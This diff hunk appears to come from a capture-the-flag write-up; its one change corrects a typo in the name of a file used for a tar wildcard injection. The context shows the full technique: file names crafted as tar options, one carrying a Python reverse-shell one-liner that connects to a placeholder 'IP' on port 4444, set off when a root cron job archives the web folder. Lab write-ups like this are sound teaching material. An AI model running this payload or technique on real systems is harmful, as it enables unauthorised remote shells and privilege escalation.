@@ -226,7 +226,7 @@ The script archived the contents of `/var/www/html` into `/home/milesdyson/backu
 To trigger the tar wildcard vulnerability, I created the files `--checkpoint=1` and `--checkpoint-action=exec=<reverse-shell>` in `/var/www/html`, causing `tar` to interpret them as command-line options and execute the payload when the cron job ran.
 
 ```bash 
-echo "" > '--chechpoint=1'
+echo "" > '--checkpoint=1'
 echo "" > '--checkpoint-action=exec=python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"IP\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"sh\")"'
 ```
 
